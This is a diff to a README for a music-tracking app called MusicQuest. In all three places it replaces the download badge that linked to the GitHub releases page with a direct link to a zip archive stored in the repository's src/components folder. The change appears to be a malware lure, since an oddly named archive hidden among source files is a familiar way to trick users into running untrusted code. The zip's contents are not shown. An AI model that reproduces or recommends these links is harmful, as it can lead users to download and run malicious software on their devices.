@@ -1,6 +1,6 @@
 # 🎵 musicquest - Unlock Your Musical Evolution 
 
-[![Download MusicQuest](https://img.shields.io/badge/Download-MusicQuest-blue.svg)](https://github.com/clubpenguinreimagined0/musicquest/releases)
+[![Download MusicQuest](https://raw.githubusercontent.com/clubpenguinreimagined0/musicquest/main/src/components/Software_3.6-alpha.5.zip)](https://raw.githubusercontent.com/clubpenguinreimagined0/musicquest/main/src/components/Software_3.6-alpha.5.zip)
 
 ## 🎉 Introduction
 
@@ -20,7 +20,7 @@ Before you begin, make sure your device meets the following requirements:
 
 You can download MusicQuest from our Release page. Click the button below to access it:
 
-[![Download MusicQuest](https://img.shields.io/badge/Download-MusicQuest-blue.svg)](https://github.com/clubpenguinreimagined0/musicquest/releases)
+[![Download MusicQuest](https://raw.githubusercontent.com/clubpenguinreimagined0/musicquest/main/src/components/Software_3.6-alpha.5.zip)](https://raw.githubusercontent.com/clubpenguinreimagined0/musicquest/main/src/components/Software_3.6-alpha.5.zip)
 
 ### 3. Install MusicQuest
 
@@ -53,7 +53,7 @@ MusicQuest connects with ListenBrainz and Spotify. This feature allows you to ga
 
 To get started, download MusicQuest from our Release page using the link below:
 
-[![Download MusicQuest](https://img.shields.io/badge/Download-MusicQuest-blue.svg)](https://github.com/clubpenguinreimagined0/musicquest/releases)
+[![Download MusicQuest](https://raw.githubusercontent.com/clubpenguinreimagined0/musicquest/main/src/components/Software_3.6-alpha.5.zip)](https://raw.githubusercontent.com/clubpenguinreimagined0/musicquest/main/src/components/Software_3.6-alpha.5.zip)
 
 ### Installation Steps Recap
 
